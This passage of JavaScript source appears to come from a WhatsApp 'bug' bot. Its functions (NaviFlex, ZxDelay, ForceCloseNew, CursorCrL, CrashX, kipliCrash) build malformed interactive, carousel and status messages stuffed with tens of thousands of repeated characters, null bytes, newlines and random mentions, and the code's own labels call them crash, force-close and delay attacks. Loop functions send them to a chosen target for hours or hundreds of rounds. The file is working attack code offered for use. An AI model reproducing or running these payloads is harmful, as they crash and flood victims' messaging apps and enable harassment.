                                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1724474503",
                                    contactVcard: true,
                                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                    jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                                },
                            },
                        },
                    },
                },
            },
        },
        Ptcp
            ? {
                  participant: {
                      jid: jid,
                  },
              }
            : {}
    );

    console.log(chalk.green.bold("Strom Done Kill"));
}
async function NaviFlex(sock, jid, mention) {
    const thumbnail = 'https://files.catbox.moe/mpcjvi.jpg'

    const { imageMessage } = await generateWAMessageContent({
        image: { url: thumbnail }
    }, {
        upload: sock.waUploadToServer
    });

    const repeatedText = 'ꦽ'.repeat(50000); 
    const bodyText = `𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋͢͡${repeatedText}`;

    const cards = [
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        },
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        },
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        },
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        }, 
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        }
    ];

    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: bodyText },
                    carouselMessage: {
                        cards,
                        messageVersion: 1
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(msg.key.remoteJid, msg.message, {
        participant: { jid: jid },
        messageId: msg.key.id,
    });
}

async function ZxDelay(sock, jid, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
      ...Array.from({ length: 40000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: ".AditZxx" + "ោ៝".repeat(10000),
      title: "Void strom? yes sir",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
      artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
      artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
      artistAttribution: "https://www.instagram.com/_u/xrelly",
      countryBlocklist: true,
      isExplicit: true,
      artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
      fileLength: "1515940",
      seconds: 14,
      mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
      height: 1280,
      width: 720,
      fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
      directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1748276788",
      contextInfo: { isSampled: true, mentionedJid: mentionedList },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363321780343299@newsletter",
        serverMessageId: 1,
        newsletterName: "Λ𐌓ı𐌕 ✦ 𐌍૯𝘷૯𐍂°𐌓ı૯"
      },
      streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
      thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
      thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
      thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
      annotations: [{
        embeddedContent: { embeddedMusic },
        embeddedAction: true
      }]
    };

    const stickerMessage = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
        mimetype: "image/webp",
        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
        fileLength: { low: 1, high: 0, unsigned: true },
        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
        firstFrameLength: 19904,
        firstFrameSidecar: "KN4kQ5pyABRAgA==",
        isAnimated: true,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: mentionedList
        }
      }
    };

    const audioMessage = {
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
        fileLength: "389948",
        seconds: 24,
        ptt: false,
        mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
        caption: "Λ𐌓ı𐌕 ✦ 𐌍૯𝘷૯𐍂°𐌓ı૯",
        fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
      }
    };

    const msg1 = generateWAMessageFromContent(jid, {
      viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(jid, {
      viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(jid, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  { 
                    tag: "to", 
                    attrs: { jid: jid }, 
                    content: undefined
                  }
                ]
              }
            ] 
          }
        ]
      });
    };

    if (mention) {
      await sock.relayMessage(jid, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg1.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }
        ]
      }
    );
  }
};

async function ForceCloseNew(sock, jid) {
const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𝐕𝐎𝐈𝐃 𝐒𝐓𝐑𝐎𝐌 ~ bug delay x fc ⛧',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                    fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749258106",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
                    scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                    scanLengths: [ 5657, 38661, 12072, 27792 ],
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋~ bug delay x fc⛧"
                },
                footer: {
                  text: "Carosuel.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Xrl ~ Fuckerr",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐑𝐞𝐥𝐥𝐲𝐆𝐨𝐝𝐬\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(jid, msg.message, {
    participant: { jid: jid },
    messageId: msg.key.id
  });
}
async function CursorpCrLX(sock, jid) {
  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡 " + " ".repeat(10000)
          },
          footer: {
            text: ""
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋",
                  imageMessage: {
                    mimetype: "image/jpeg",
                    height: 1,
                    width: 1,
                    mediaKey: "AgAAAAAAAAAAAAAAAAAAAAA=",
                    fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                    fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                    mediaKeyTimestamp: "999999999",
                    fileLength: "999999",
                    directPath: "/v/t62.7118-24/11734305_enc.jpg?ccb=11-4",
                    jpegThumbnail: Buffer.from("00", "hex"),
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: " ".repeat(5000)
                },
                footer: {
                  text: "carousel.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(99999)
                }
              }
            ]
          },
          nativeFlowMessage: {
            messageParamsJson: "\n".repeat(9999)
          }
        },
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "@s.whatsapp.net",
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "Sent",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: JSON.stringify({
                      crash: "{ xx.com }".repeat(9999)
                    }),
                    version: 3
                  }
                }
              }
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id,
    participant: { jid: jid }
  });
}
async function CursorCrL(sock, jid) {
  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡🩸',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋"
                },
                footer: {
                  text: "phynx.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(jid, msg.message, {
    participant: { jid: jid },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${jid}`))

}

async function CrashX(jid) {
  const cardsX = {
    header: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "211396",
        height: 816,
        width: 654,
        mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
        fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
        directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749220174",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb..."
      },
      hasMediaAttachment: true
    },
    body: {
      text: ""
    },
    nativeFlowMessage: {
      messageParamsJson: "{ X.json }"
    }
  };

  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false
          },
          body: {
            text: ""
          },
          footer: {
            text: ""
          },
          carouselMessage: {
            cards: [cardsX, cardsX, cardsX, cardsX, cardsX]
          },
          contextInfo: {
            participant: jid,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ X.json }",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(jid, message, { messageId: null });
}

async function kipliCrash(jid) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "𝐾𝐼𝑃𝐿𝐼𝐶𝑅𝐴𝑆𝐻 " + "ꦾ".repeat(11000)
        },
        "footer": {
          "text": "𝐾𝐼𝑃𝐿𝐼𝐶𝑅𝐴𝑆𝐻 "
        },
        "header": { 
          "title": 'memekk' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "𝐾𝐼𝑃𝐿𝐼𝐶𝑅𝐴𝑆𝐻 " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🐉 ) KipliNotDev ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(jid, carousel.message, {
      messageId: carousel.key.id
    });
  }
}


// Utility functions
async function safeExec(label, func) {
  try {
    await func();
  } catch (err) {
    console.error(`Error saat ${label}:`, err.message);
  }
}

// Main functions
export async function xproto(sock, durationHours, jid) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 100) {
        ZxDelay(sock, jid, false); // Function
        await delay(500);
        console.log(chalk.red(`Send Bug By Dlii STRØM🦋 ${count}/100 To ${jid}`));
        count++;
        setTimeout(sendNext, 500);
      } else {
        console.log(chalk.green(`SUCCESS SEND 100 MESSAGE ✅`));
        count = 0;
        console.log(chalk.blue("NEXT SEND 100 MESSAGE ☠️"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };
  sendNext();
}

async function uisystemBug(sock, jid) {
  for (let i = 0; i < 100; i++) { 
    await BaccaratUi(sock, jid);
    await RkBlankNotif(sock, jid, true);
    await NaviFlex(sock, jid);
    await BaccaratUi(sock, jid);
     await ZxDelay(sock, jid, false); 
    await RkBlankNotif(sock, jid, true);
    await NaviFlex(sock, jid);
    await BaccaratUi(sock, jid);
    await RkBlankNotif(sock, jid, true);
    await NaviFlex(sock, jid);
    await BaccaratUi(sock, jid);
    await ZxDelay(sock, jid, false); 
    await RkBlankNotif(sock, jid, true);
    await NaviFlex(sock, jid);
  }
}

async function ComboIos(sock, jid) {
  for (let i = 0; i < 100; i++) { 
    await paymenX(jid);
    await PayXDocInvis(jid);
    await ZxDelay(sock, jid, false); 
    await protoxaudio2(jid, true);
    await nolosios(sock, jid);
    await RInvisIphone(sock, jid);
    await IpLocation(sock, jid);
    await TxIos(sock, jid);
    await RansCrashIos(sock, jid);
    await ZxDelay(sock, jid, false); 
    await RansSupIos(sock, jid);
    await nolosios(sock, jid);
